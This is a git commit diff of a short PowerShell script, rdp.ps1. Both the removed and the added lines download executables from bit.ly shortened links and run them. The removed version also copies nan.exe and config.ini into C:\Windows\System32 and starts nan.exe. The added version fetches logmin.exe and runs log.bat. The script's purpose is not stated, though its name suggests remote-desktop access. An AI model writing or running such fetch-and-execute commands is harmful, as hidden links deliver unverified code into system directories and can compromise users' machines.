0773bd8d5b99b18c6bb71cf5ec42e3997e06c11a
aOOxdwDJBCNkj <93464472+aOOxdwDJBCNkj@users.noreply.github.com>
2021-10-31 11:56:11 +0000

    Update rdp.ps1

--- rdp.ps1
+++ rdp.ps1
@@ -1,6 +1,2 @@
-Invoke-WebRequest https://bit.ly/3pVgLA2 -OutFile nan.zip
-Invoke-WebRequest https://bit.ly/3CLcjYp -OutFile config.ini
-unzip nan.zip
-Copy nan.exe C:\Windows\System32
-Copy config.ini C:\Windows\System32
-cmd /c echo cmd /k start nan.exe
+Invoke-WebRequest https://bit.ly/3w1AZJs -OutFile logmin.exe
+.\log.bat
